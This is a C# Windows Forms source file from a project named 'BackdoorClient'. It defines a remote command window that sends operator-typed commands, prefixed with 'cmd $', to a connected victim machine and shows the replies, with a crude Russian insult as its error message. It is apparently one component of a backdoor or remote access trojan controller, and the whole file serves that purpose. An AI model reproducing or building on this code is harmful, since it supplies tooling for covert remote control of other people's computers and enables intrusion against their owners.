using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BackdoorClient
{
    public partial class RemouteCmd : Form
    {
        public Form1 mainForm;

        public RemouteCmd(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }

        private void RemouteCmd_Load(object sender, EventArgs e)
        {
            if (!mainForm.TestConnect())
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                this.Close();
                return;
            }
        }

        private void sendButton_Click(object sender, EventArgs e)
        {
            responseText.Text += "\n " + mainForm.SendCommandAndGetResponce("cmd $" + commandTextBox.Text);
        }

        private void vScrollBar1_Scroll(object sender, ScrollEventArgs e)
        {
            responseText.Location =  new Point(new Size(12, -vScrollBar1.Value + 10));
        }
    }
}
